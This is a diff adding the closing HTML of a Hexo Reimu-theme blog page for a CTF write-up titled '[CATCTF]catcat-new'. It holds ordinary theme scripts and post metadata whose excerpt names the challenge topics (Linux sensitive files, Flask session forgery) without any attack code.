+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "fuboy",
+          title: "[CATCTF]catcat-new",
+          url: "http://example.com/2025/04/04/[CATCTF]catcat-new/",
+          excerpt: "",
+          description: "",
+          stripContent: "知识点12345678910111213141516171819Linux系统敏感文件，flask_session_cookie_manager伪造session并执行，session存储在cookie中/etc/passwd该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell（以冒号作为分隔符）/proc/selfproc是一个伪文件系统，它提供了内核数据结构的接口。内核",
+          date: "Fri Apr 04 2025 16:27:08 GMT+0800",
+          updated: "Fri Apr 04 2025 17:40:08 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
